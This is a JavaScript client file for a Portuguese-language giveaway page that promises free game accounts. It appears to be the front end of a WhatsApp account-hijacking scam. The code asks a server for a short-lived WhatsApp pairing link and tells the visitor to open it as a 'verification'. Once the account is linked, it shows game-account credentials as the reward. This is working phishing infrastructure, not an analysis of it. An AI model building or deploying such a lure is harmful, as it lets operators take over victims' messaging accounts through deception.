/**
 * app.js - Main client application.
 * Handles Socket.io communication, screen transitions, and UI logic.
 */
import { initParticles, initDecorations, launchConfetti } from './animations.js';

// ---- Configuration ----
const QR_EXPIRY_SECONDS = 20; // WhatsApp QR expires ~20s

// ---- State ----
let socket = null;
let currentScreen = 'welcome';
let timerInterval = null;
let timerSeconds = QR_EXPIRY_SECONDS;

// ---- DOM Elements ----
const screens = {
    welcome: document.getElementById('screen-welcome'),
    pairing: document.getElementById('screen-pairing'),
    success: document.getElementById('screen-success'),
    outofstock: document.getElementById('screen-outofstock')
};

const btnWantWin = document.getElementById('btn-want-win');
const whatsappLink = document.getElementById('whatsapp-link');
const timerBar = document.getElementById('timer-progress');
const timerText = document.getElementById('timer-text');
const statusMessage = document.getElementById('status-message');
const spinner = document.getElementById('spinner');
const credentialUsername = document.getElementById('credential-username');
const credentialPassword = document.getElementById('credential-password');
const btnCopy = document.getElementById('btn-copy');

// ---- Get game type from body data attribute ----
const gameType = document.body.dataset.game;

// ---- Initialize ----
function init() {
    // Connect to Socket.io server
    socket = io();

    // Setup event listeners
    setupSocketListeners();
    setupUIListeners();

    // Initialize visual effects
    initParticles(gameType);
    initDecorations(gameType);
}

// ---- Screen Navigation ----
function showScreen(screenName) {
    // Hide current screen
    Object.values(screens).forEach(screen => {
        if (screen) screen.classList.remove('active');
    });

    // Show target screen
    if (screens[screenName]) {
        screens[screenName].classList.add('active');
        currentScreen = screenName;
    }
}

// ---- Timer ----
function startTimer() {
    timerSeconds = QR_EXPIRY_SECONDS;
    updateTimerUI();

    clearInterval(timerInterval);
    timerInterval = setInterval(() => {
        timerSeconds--;
        updateTimerUI();

        if (timerSeconds <= 0) {
            clearInterval(timerInterval);
            // Timer expired - waiting for new link from server
            if (timerBar) timerBar.style.width = '0%';
            if (timerText) timerText.textContent = 'Gerando novo link...';
        }
    }, 1000);
}

function updateTimerUI() {
    const percentage = (timerSeconds / QR_EXPIRY_SECONDS) * 100;

    if (timerBar) {
        timerBar.style.width = percentage + '%';
        timerBar.classList.toggle('expiring', timerSeconds <= 5);
    }

    if (timerText) {
        timerText.textContent = timerSeconds > 0
            ? `Link expira em ${timerSeconds}s`
            : 'Gerando novo link...';
    }
}

function stopTimer() {
    clearInterval(timerInterval);
}

// ---- Socket.io Event Handlers ----
function setupSocketListeners() {
    // Received a new pairing link
    socket.on('pairingLink', (data) => {
        console.log('Received pairing link');

        // Update the WhatsApp button link
        if (whatsappLink) {
            whatsappLink.href = data.link;
        }

        // Show pairing screen if not already showing
        if (currentScreen !== 'pairing') {
            showScreen('pairing');
        }

        // Enable the button
        if (whatsappLink) {
            whatsappLink.classList.remove('disabled');
            whatsappLink.style.pointerEvents = 'auto';
            whatsappLink.style.opacity = '1';
        }

        // Reset and start timer
        startTimer();

        // Update status
        setStatus('Aguardando verificação...', 'waiting');
    });

    // WhatsApp connected successfully!
    socket.on('connected', (data) => {
        console.log('WhatsApp connected! Credentials received.');
        stopTimer();

        // Show credentials
        if (credentialUsername) credentialUsername.textContent = data.username;
        if (credentialPassword) credentialPassword.textContent = data.password;

        // Switch to success screen
        showScreen('success');

        // Launch confetti celebration!
        setTimeout(() => launchConfetti(), 300);

        // Play success sound (optional, browser permitting)
        playSuccessSound();
    });

    // Game out of stock
    socket.on('outOfStock', (data) => {
        console.log('Game out of stock');
        stopTimer();

        // Re-enable button in case it was disabled
        if (btnWantWin) {
            btnWantWin.textContent = '🎁 EU QUERO ESSA CONTA!';
            btnWantWin.style.pointerEvents = 'auto';
            btnWantWin.style.opacity = '1';
            btnWantWin.classList.add('btn-glow');
        }

        showScreen('outofstock');
    });

    // Session expired
    socket.on('sessionExpired', (data) => {
        stopTimer();
        setStatus(data.message || 'Sessão expirada. Tente novamente.', 'error');

        // Disable button
        if (whatsappLink) {
            whatsappLink.style.opacity = '0.5';
            whatsappLink.style.pointerEvents = 'none';
        }
    });

    // Error
    socket.on('error', (data) => {
        stopTimer();
        setStatus(data.message || 'Ocorreu um erro. Tente novamente.', 'error');
    });

    // Status update
    socket.on('status', (data) => {
        setStatus(data.message, 'waiting');
    });

    // Socket disconnected
    socket.on('disconnect', () => {
        stopTimer();
        setStatus('Conexão perdida. Reconectando...', 'error');
    });

    // Socket reconnected
    socket.on('connect', () => {
        if (currentScreen === 'pairing') {
            setStatus('Reconectado! Gerando novo link...', 'waiting');
        }
    });
}

// ---- UI Event Handlers ----
function setupUIListeners() {
    // "QUERO GANHAR" button
    if (btnWantWin) {
        btnWantWin.addEventListener('click', () => {
            // Request a WhatsApp session from the server
            socket.emit('requestSession', { gameType });

            // Show loading state
            btnWantWin.textContent = '⏳ Gerando link...';
            btnWantWin.style.pointerEvents = 'none';
            btnWantWin.style.opacity = '0.7';
            btnWantWin.classList.remove('btn-glow');
        });
    }

    // "VERIFICAR WHATSAPP" button - it's an <a> tag, so clicking it opens the link
    // No additional JS needed for the click - the href does the work!

    // "Copy Credentials" button
    if (btnCopy) {
        btnCopy.addEventListener('click', async () => {
            const username = credentialUsername?.textContent || '';
            const password = credentialPassword?.textContent || '';
            const text = `Nome: ${username}\nSenha: ${password}`;

            try {
                await navigator.clipboard.writeText(text);
                btnCopy.textContent = '✅ Copiado!';
                btnCopy.classList.add('copied');
                setTimeout(() => {
                    btnCopy.textContent = '📋 Copiar Credenciais';
                    btnCopy.classList.remove('copied');
                }, 2500);
            } catch (err) {
                // Fallback for older browsers
                const textarea = document.createElement('textarea');
                textarea.value = text;
                document.body.appendChild(textarea);
                textarea.select();
                document.execCommand('copy');
                document.body.removeChild(textarea);
                btnCopy.textContent = '✅ Copiado!';
                btnCopy.classList.add('copied');
                setTimeout(() => {
                    btnCopy.textContent = '📋 Copiar Credenciais';
                    btnCopy.classList.remove('copied');
                }, 2500);
            }
        });
    }
}

// ---- Helpers ----
function setStatus(message, type = 'waiting') {
    if (statusMessage) {
        statusMessage.textContent = message;
        statusMessage.className = 'status-text';
        if (type === 'success') statusMessage.classList.add('success');
        if (type === 'error') statusMessage.classList.add('error');
    }

    if (spinner) {
        spinner.classList.toggle('hidden', type !== 'waiting');
    }
}

function playSuccessSound() {
    try {
        const ctx = new (window.AudioContext || window.webkitAudioContext)();
        const notes = [523.25, 659.25, 783.99, 1046.50]; // C5, E5, G5, C6

        notes.forEach((freq, i) => {
            const osc = ctx.createOscillator();
            const gain = ctx.createGain();
            osc.connect(gain);
            gain.connect(ctx.destination);

            osc.frequency.value = freq;
            osc.type = 'sine';
            gain.gain.setValueAtTime(0.1, ctx.currentTime + i * 0.15);
            gain.gain.exponentialRampToValueAtTime(0.001, ctx.currentTime + i * 0.15 + 0.5);

            osc.start(ctx.currentTime + i * 0.15);
            osc.stop(ctx.currentTime + i * 0.15 + 0.5);
        });
    } catch (e) {
        // Audio not supported or blocked - that's fine
    }
}

// ---- Start the app ----
document.addEventListener('DOMContentLoaded', init);
